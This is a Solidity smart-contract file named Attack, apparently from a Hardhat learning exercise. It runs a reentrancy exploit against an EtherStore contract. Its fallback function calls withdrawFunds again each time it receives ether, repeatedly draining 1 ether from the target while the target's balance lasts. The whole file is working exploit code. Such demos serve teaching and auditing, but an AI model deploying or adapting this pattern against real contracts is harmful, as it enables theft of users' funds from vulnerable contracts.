// SPDX-License-Identifier:MIT;
pragma solidity  ^0.6.10;
import "hardhat/console.sol";
interface IEtherStore { 
    function depositFunds () external payable;
    function withdrawFunds(uint256 amount) external;
    function getContractBalance() external view returns(uint256)  ;
}
contract Attack{
    IEtherStore public etherStore;    
    constructor(address etherStoreAddress) public{
        etherStore= IEtherStore(etherStoreAddress);
        console.log("Contract Deployed on  VM");
    }
    fallback() external  payable{
        console.log("fallback function called");
        if(address(etherStore).balance >=1 ether ){
            etherStore.withdrawFunds(1 ether);
        }
    }
    function deposit() external payable{
        require(msg.value >= 1 ether, "Amount  should  be grater then 1 ether !!");
        etherStore.depositFunds{value:msg.value}();
        // etherStore.withdrawFunds(1 ether);
    }
    
    function attack() external payable{
        // require(msg.value >= 1 ether, "Amount  should  be grater then 1 ether !!");
        // etherStore.depositFunds{value:1 ether}();
        etherStore.withdrawFunds(1 ether);
    }
    
    function balanceOf(address addr) public view returns(uint256) {
        return address(this).balance;
    }
}